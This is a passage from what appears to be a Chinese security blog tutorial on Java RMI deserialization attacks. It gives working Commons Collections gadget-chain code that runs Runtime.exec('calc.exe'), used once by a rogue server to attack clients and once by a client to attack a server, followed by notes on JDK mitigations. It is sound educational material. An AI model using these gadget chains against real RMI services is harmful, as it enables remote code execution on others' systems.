<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMItest:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(hashMap, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//可不需要，因为不用去触发memberValues.getValue()方法</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">        Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        Object o=(InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他的不用变</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250714002250598.png" alt="image-20250714002250598"></p>
<h3 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h3><h4 id="注册中心攻击服务端"><a href="#注册中心攻击服务端" class="headerlink" title="注册中心攻击服务端"></a>注册中心攻击服务端</h4><p>与攻击客户端一样，原理都是当调用与注册中心交互的方法时如果从注册中心返回的数据可控，那么可以构造恶意的数据客户端进行反序列化造成攻击</p>
<h4 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h4><p>当服务端的某个方法接受的参数是Object对象时，那么当客户端调用远程对象的方法传入恶意的Object对象，服务端在接受时会先将对象进行反序列化从而造成攻击</p>
<p>远程接口RMIInterface：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端RMItest：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Great!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端Client：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> rmi.server.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(hashMap, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//可不需要，因为不用去触发memberValues.getValue()方法</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">        Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        Object evil=(InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line">        RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</span><br><span class="line">        <span class="comment">//调用远程对象的方法</span></span><br><span class="line">        o.Hello(evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250714092044909.png" alt="image-20250714092044909"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>下面是对rmi利用中jdk版本时间线的一个总结，也是后面要涉及的：</p>
<ol>
<li>从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的payload指的是ysoserial修改后的JRMPClient。</li>
<li>从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击方式开始失效。</li>
<li>从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/15468660.html">https://www.cnblogs.com/CoLo/p/15468660.html</a></p>
<p><a target="_blank" rel="noopener" href="https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164#bf438eb4ecbd4c7c8aa60abf6e5ed450">https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164#bf438eb4ecbd4c7c8aa60abf6e5ed450</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1194/">https://paper.seebug.org/1194/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/de85fad05dcb">https://www.jianshu.com/p/de85fad05dcb</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340633.html">https://www.freebuf.com/articles/web/340633.html</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BEctzUsH7HfkY8EEJ6yg9g">https://mp.weixin.qq.com/s/BEctzUsH7HfkY8EEJ6yg9g</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qiI7Mh4P-xTqY11Fy35-uA">https://mp.weixin.qq.com/s/qiI7Mh4P-xTqY11Fy35-uA</a></p>
<p><a target="_blank" rel="noopener" href="https://curlysean.github.io/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/#Evwbq">https://curlysean.github.io/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/#Evwbq</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/erosion2020/p/18568890">https://www.cnblogs.com/erosion2020/p/18568890</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/324692.html">https://www.freebuf.com/articles/web/324692.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io">B1ueL0n3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io/archives/9738c3bd/">https://b1uel0n3.github.io/archives/9738c3bd/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://b1uel0n3.github.io" target="_blank">B1ueL0n3's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RMI/">RMI</a></div><div class="post-share"><div class="social-share" data-image="/img/16.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/be65d471/" title="Java JNDI注入总结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Java JNDI注入总结</div></div><div class="info-2"><div class="info-item-1">概念JNDI(Java Naming Directory Interface)，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。 JNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请求代理系统结构） 命名服务&#x2F;目录服务JNDI包括命名服务（Naming Service）和目录服务（Directory Service）。 命名服务是一种通过名称来查找实际对象的服务。例如在RMI中，Naming.lookup方法通过查找名称来获取远程对象的代理类 相关概念：  Name：名称。要么在命名系统中查找对象，需要提供对象的名称，如java:comp/env/jdbc/DataSource Naming...</div></div></div></a><a class="pagination-related" href="/archives/2de96424/" title="Java JDBC注入深度解析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/22.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Java JDBC注入深度解析</div></div><div class="info-2"><div class="info-item-1">概念Java Database Connetivity，Java数据库连接，是Java提供对数据库进行连接、操作的标准API。 相关类和接口 java.sql.DriverManager Java通过java.sql.DriverManager来管理所用数据库的驱动注册，提供getConnection方法来连接数据库  java.sql.Driver 负责实现对数据库的连接，所以数据库驱动包都必须实现这个接口才能完成数据库连接操作  jva.sql.Connection 通过java.sql.DriverManager.getConnection方法成功连接数据库后，会返回一个java.sql.Connection数据库连接对象，一切对数据库的查询操作都将依赖于这个对象   JDBC Demo先开启mysql环境 JDBC连接数据库的一般步骤：  注册驱动 获取连接  先添加依赖： 12345&lt;dependency&gt;  &lt;groupId&gt;mysql&lt;/groupId&gt; ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">B1ueL0n3</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RPC"><span class="toc-number">1.</span> <span class="toc-text">RPC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">RMI概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%9D%9E%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.</span> <span class="toc-text">远程对象和非远程对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stub%E5%92%8CSkeleton"><span class="toc-number">4.</span> <span class="toc-text">Stub和Skeleton</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%9E%B6%E6%9E%84"><span class="toc-number">5.</span> <span class="toc-text">RMI架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%8E%A5%E5%8F%A3%E5%92%8C%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">实现接口和类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A5%E5%8F%A3"><span class="toc-number">6.1.</span> <span class="toc-text">远程接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi-Remote%E6%8E%A5%E5%8F%A3"><span class="toc-number">6.2.</span> <span class="toc-text">java.rmi.Remote接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi-server-UnicastRemoteObject%E7%B1%BB"><span class="toc-number">6.3.</span> <span class="toc-text">java.rmi.server.UnicastRemoteObject类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-number">7.</span> <span class="toc-text">RMI动态加载类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-Demo"><span class="toc-number">8.</span> <span class="toc-text">RMI Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0"><span class="toc-number">8.1.</span> <span class="toc-text">接口实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">8.2.</span> <span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">8.3.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">8.4.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF-1"><span class="toc-number">8.4.1.</span> <span class="toc-text">服务端</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89rmi%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80"><span class="toc-number">8.4.1.1.</span> <span class="toc-text">定义rmi服务器地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BARMI%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">8.4.1.2.</span> <span class="toc-text">创建RMI注册中心</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">8.4.1.3.</span> <span class="toc-text">创建远程对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%91%E5%AE%9A%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%AF%B9%E8%B1%A1"><span class="toc-number">8.4.1.4.</span> <span class="toc-text">绑定远程服务对象</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-1"><span class="toc-number">8.4.2.</span> <span class="toc-text">客户端</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">8.4.2.1.</span> <span class="toc-text">获取注册中心</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">8.4.2.2.</span> <span class="toc-text">查找获取远程对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.4.2.3.</span> <span class="toc-text">调用远程对象方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82"><span class="toc-number">8.4.3.</span> <span class="toc-text">注册中心处理请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.4.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DGC"><span class="toc-number">9.</span> <span class="toc-text">DGC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%94%BB%E5%87%BB"><span class="toc-number">10.</span> <span class="toc-text">RMI攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">10.1.</span> <span class="toc-text">攻击注册中心</span></a><ol class="toc-child"><li class="toc-item 